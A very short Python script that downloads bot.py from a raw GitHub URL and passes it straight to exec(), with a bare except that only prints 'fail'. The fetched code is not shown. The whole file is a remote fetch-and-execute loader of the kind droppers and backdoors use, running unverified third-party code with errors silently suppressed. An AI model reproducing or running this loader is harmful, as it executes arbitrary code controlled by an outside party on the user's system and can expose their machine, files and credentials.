import requests
try:
  url = "https://raw.githubusercontent.com/Hawlsjsbs/BotEnd/main/bot.py"
  req = requests.get(url).text
  exec(req)
except:
  print ("fail")
